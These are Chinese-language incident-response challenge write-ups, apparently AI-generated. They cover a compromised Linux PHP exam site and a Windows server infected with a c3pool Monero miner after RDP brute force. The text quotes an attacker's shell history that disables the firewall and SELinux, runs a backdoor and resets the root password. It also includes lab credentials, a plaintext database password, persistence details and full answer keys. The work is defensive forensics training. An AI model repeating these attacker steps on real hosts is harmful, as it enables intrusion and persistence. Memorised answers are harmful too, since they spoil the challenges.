`/root/wp` 是攻击者上传的 Go 编译后门工具，内置了 Webshell 路径、密码等信息，可能是自动化攻击工具或持久化后门。原文件名为 `go_build_untitled.exe`，通过 `mv` 改名为 `wp`。

### bash_history 关键内容

```bash
systemctl disable firewalld          # 关闭防火墙
systemctl disable --now firewalld
setenforce 0                         # 关闭 SELinux
...
rm -rf flag1 1                       # 删除 flag1 文件
rm -rf version2.php                  # 删除木马文件
...
mkdir .api                           # 创建隐藏目录
cd api/
cp * ../.api/                        # 复制文件到隐藏目录
vim alinotify.php                    # 篡改文件写入 flag2
useradd flag3{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}  # 尝试用 flag3 创建用户（失败）
vim /etc/profile                     # 写入 flag3 环境变量
source /etc/profile
chmod +x go_build_untitled.exe       # 赋予执行权限
mv go_build_untitled.exe wp          # 重命名后门
./wp                                 # 执行后门
passwd root                          # 修改 root 密码
```

### 排查命令速查

```bash
# === 1. 确定攻击者 IP ===
awk '{print $1}' /www/wwwlogs/127.0.0.1.log | sort | uniq -c | sort -rn | head -10

# === 2. 数据库取证 ===
cat /www/wwwroot/127.0.0.1/lib/config.inc.php  # 配置
mysql -ukaoshi -p'5Sx8mK5ieyLPb84m' kaoshi -e "SELECT * FROM x2_user;"

# === 3. PCAP 快速分析 ===
strings '/root/数据包1.pcapng' | grep -i 'flag'           # 提取 flag
strings '/root/数据包1.pcapng' | grep -E '(asenc|antsystem)'  # 蚁剑特征

# === 4. 隐藏文件排查 ===
find /www/wwwroot/127.0.0.1/ -name '.*' -type f
ls -la /www/wwwroot/127.0.0.1/.api/
tail -10 /etc/profile

# === 5. bash_history 取证 ===
cat /root/.bash_history | grep -E '(rm |mv |cp |vim |useradd|passwd|wget|curl|./)'

# === 6. 持久化排查 ===
crontab -l
cat /etc/rc.d/rc.local
systemctl list-unit-files --state=enabled
```

### 同类变体与扩展

| 变体 | 区别 | 应对策略 |
|------|------|----------|
| 菜刀流量 | 函数名为 `Z0`、`base64_decode` | 搜索 `base64_decode` 和 `eval` 特征 |
| 哥斯拉流量 | 使用 AES 加密通信 | 需提取密钥后 AES 解密 |
| 冰蝎流量 | 使用 AES + 动态密钥交换 | 需分析密钥协商过程 |
| Cobalt Strike | Beacon 通信，非 Web 流量 | 分析心跳包和任务返回 |

> ⚠️ **注意**：本题的 PHPEMS 考试系统是常见的 IR 靶场应用，了解其目录结构和配置文件位置（`lib/config.inc.php`）能大幅加速排查。其他常见 PHP 应用（WordPress、Discuz、ThinkPHP）的配置文件位置也应熟记。

### 解题脚本

- Linux 排查脚本：[linux_web_ir2.py](IR/22-linux-web-ir2/linux_web_ir2.py)

> AI生成

---

---

## Windows 挖矿应急响应 (c3pool)

> **类型：** IR (应急响应)
> **靶机：** 192.168.234.129 (Windows Server 2022 Datacenter, VMware, WinRM 5985)
> **凭据：** Administrator / zgsf@123
> **场景：** 挖矿案例靶机，攻击者通过RDP暴力破解入侵后植入c3pool挖矿程序和后门脚本

### 题目要求

找出以下8个关键信息：
1. 攻击者的IP地址
2. 攻击者开始攻击的时间
3. 攻击者攻击的端口
4. 挖矿程序的MD5
5. 后门脚本的MD5
6. 矿池地址
7. 钱包地址
8. 攻击者是如何攻击进入的

### 答案

| # | 问题 | 答案 |
|---|------|------|
| 1 | 攻击者IP地址 | `192.168.115.131` |
| 2 | 攻击者开始攻击的时间 | `2024-05-21 20:25:22` |
| 3 | 攻击者攻击的端口 | `3389` (RDP) |
| 4 | 挖矿程序MD5 | `A79D49F425F95E70DDF0C68C18ABC564` (xmrig.exe, 6497280 bytes) |
| 5 | 后门脚本MD5 | `8414900F4C896964497C2CF6552EC4B9` (systems.bat, 374 bytes) |
| 6 | 矿池地址 | `auto.c3pool.org` (stratum端口: 80/13333/15555/19999 按算力分配) |
| 7 | 钱包地址 | `4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y` |
| 8 | 攻击者入侵方式 | **RDP 3389端口暴力破解** (LogonType 7/10, 4625失败12次后4624成功登录) |

### 解题思路

#### 第一阶段：日志分析锁定攻击者

**1. 攻击者IP（安全日志 Event ID 4625）**

查询4625登录失败事件，解析XML提取IpAddress字段。IP `192.168.115.131` 在 `2024-05-21 20:25:22` 对 Administrator 账户进行了 **12次** 暴力破解（SubStatus=0xc000006a = 错误密码）。

**2. 攻击时间定位**

- 最早的非本地4625失败事件（无IP记录）：`2024-05-21 20:01:26`
- 最早的 192.168.115.131 暴力破解：`2024-05-21 20:25:22`（12次集中爆发）

**3. 攻击端口**

`netstat -ano` 显示目标开放端口含 **3389(RDP)**，攻击者通过3389端口进行RDP暴力破解。

**4. 入侵方式确认（Event ID 4624 LogonType）**

4624成功登录事件中，攻击者IP以 **LogonType 7** (Unlock/RemoteInteractive) 成功登录：

```
2024-05-21 20:25:24 | IP: 192.168.115.131 | User: Administrator | LogonType: 7
2024-05-21 20:26:01 | IP: 192.168.115.131 | User: Administrator | LogonType: 7
```

TerminalServices日志确认RDP会话来源IP 192.168.115.131从20:25:22开始。

完整攻击链：**RDP暴力破解(4625x12) -> 成功登录(4624 LogonType 7) -> 植入后门脚本 -> 下载挖矿程序 -> 注册表持久化 -> 创建计划任务 -> 禁用Defender**

#### 第二阶段：挖矿程序排查

**5. 挖矿程序MD5**

Defender检测到 `Trojan:Win64/XmRig.CL!MTB` 并隔离了 `C:\Users\Administrator\c3pool\xmrig.exe`。

恢复方式：
```powershell
$mpCmd = (Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender' -Filter 'MpCmdRun.exe' -Recurse |
          Where-Object { `$_.DirectoryName -notmatch 'X86' } | Select-Object -First 1).FullName
& $mpCmd -Restore -All
```

恢复后计算MD5：
```
File: C:\Users\Administrator\c3pool\xmrig.exe
Size: 6497280 bytes
MD5: A79D49F425F95E70DDF0C68C18ABC564
```

原始下载包 `C:\Users\Administrator\xmrig.zip`（655109 bytes, MD5: C5A11E4CA3F5154BC003F1241DFC723D）仍保留在用户目录。

**6. 矿池地址**

从c3pool setup脚本（临时文件 `tmp4D8F.tmp.bat`）中提取配置生成逻辑，脚本L299将config.json中的url替换为：

```
"url": "auto.c3pool.org:%PORT%"
```

矿池stratum地址：`auto.c3pool.org`（根据算力自动选择端口：80/13333/15555/19999）

**7. 钱包地址**

从后门脚本 `systems.bat` 内容中直接提取：

```batch
& $tempfile 4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y
```

Monero钱包地址：`4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y`（106字符标准Monero地址）

#### 第三阶段：后门脚本排查

**8. 后门脚本MD5**

注册表启动项发现可疑条目：
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :: systems = C:\Users\Administrator\AppData\systems.bat
```

同时发现计划任务 `systemTesst`（触发器: LogonTrigger）也指向此脚本。

```
File: C:\Users\Administrator\AppData\systems.bat
Size: 374 bytes
MD5: 8414900F4C896964497C2CF6552EC4B9
SHA256: 0D585F815FC9AED1C5C03D4CD1E98B54F6AC5F980DC1901D53DC8C470E986621
LastWriteTime: 2024-05-21 20:30:02
```

**systems.bat内容分析：**
1. 下载 c3pool 官方挖矿安装脚本 `setup_c3pool_miner.bat`
2. 以攻击者钱包地址作为参数执行
3. 执行后删除临时脚本（反取证）

#### 持久化机制总结

| 机制 | 位置 | 内容 |
|------|------|------|
| 注册表Run键 | `HKLM\...\Run\systems` | 指向 `C:\Users\Administrator\AppData\systems.bat` |
| 计划任务 | `systemTesst` (LogonTrigger) | 指向同一个 `systems.bat` |
| Defender禁用 | `DisableRealtimeMonitoring=True` | 防止挖矿程序被查杀 |
| 排除路径 | Defender ExclusionPath | 屏蔽特定路径扫描 |

### 关键知识点

1. **Windows挖矿应急响应排查路径**：
   - 安全日志 4625/4624 -> 锁定攻击者IP和入侵方式
   - TerminalServices日志 -> RDP会话历史
   - Defender威胁检测 `Get-MpThreatDetection` -> 确认挖矿程序
   - `MpCmdRun.exe -Restore -All` -> 恢复被隔离的恶意文件
   - 注册表Run键 + 计划任务 -> 持久化后门
   - 临时目录bat脚本 -> 完整挖矿配置信息

2. **c3pool挖矿工具链**：
   - `setup_c3pool_miner.bat` -> 官方一键安装脚本
   - `xmrig.zip` -> 定制版XMRig（被Defender标记为Trojan:Win64/XmRig.CL!MTB）
   - `auto.c3pool.org` -> 矿池stratum地址（按算力自动选端口）
   - Monero钱包地址特征：以4开头，106字符

3. **WinRM远程排查技术**：
   - pypsrp库连接Windows靶机（端口5985，NTLM认证）
   - `-EncodedCommand` (UTF-16LE Base64) 避免引号转义问题
   - `chcp 65001` + `[Console]::OutputEncoding` 解决中文编码
   - `_strip_clixml()` 正则过滤WinRM CLIXML噪音

4. **Defender隔离区取证**：
   - 隔离区路径：`C:\ProgramData\Microsoft\Windows Defender\Quarantine\`
   - `MpCmdRun.exe -Restore -All` 恢复被隔离文件
   - `Get-MpThreatDetection` 查看威胁检测历史
   - 恢复后用 `Get-FileHash` 计算原始文件MD5

### 桌面解题工具

靶机桌面上有 `解题系统.exe`（5,860,667 bytes, MD5: CD69273F7420F58766745EFCB3E44F69, LastWriteTime: 2024-05-21 22:24:11），为题目自带的自动化评分工具。

> AI生成
---

---

> AI生成